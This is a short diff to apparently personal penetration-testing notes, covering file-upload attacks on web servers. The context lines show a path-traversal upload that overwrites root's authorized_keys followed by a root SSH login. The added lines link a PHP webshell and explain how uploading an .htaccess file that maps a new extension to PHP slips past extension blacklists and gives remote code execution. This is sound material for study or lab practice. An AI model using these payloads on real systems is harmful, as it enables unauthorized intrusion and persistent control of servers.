@@ -68,3 +68,20 @@ upload ../../../../../../../root/.ssh/authorized_keys
 rm ~/.ssh/known_hosts
 ssh -p 2222 -i privatekey root@mountaindesserts.com
 ```
+### Webshell
+https://github.com/WhiteWinterWolf/wwwolf-php-webshell
+### Upload .htaccess to rce
+```
+Blue teamers and developers are usually quick to blacklist file extensions, but rarely consider how webserver configuration files themselves can be exploited. Hence why the .htaccess technique can be so dangerous, even leading to RCE.
+
+This file isn't directly an RCE vector, but it does allow for the definition of new valid PHP extensions, which can then be uploaded to the server (as they are not blacklisted).
+
+An example .htaccess file that can be used to add a new PHP extension is:
+
+AddType application/x-httpd-php .evil
+Note that this attack relies on the following options being enabled, and NGINX does not support .htaccess files.
+
+/etc/apache2/apache2.conf:      AllowOverride Options
+/etc/apache2/apache2.conf:      AllowOverride FileInfo
+```
+Upload webshell.evil, then access webshell.evil
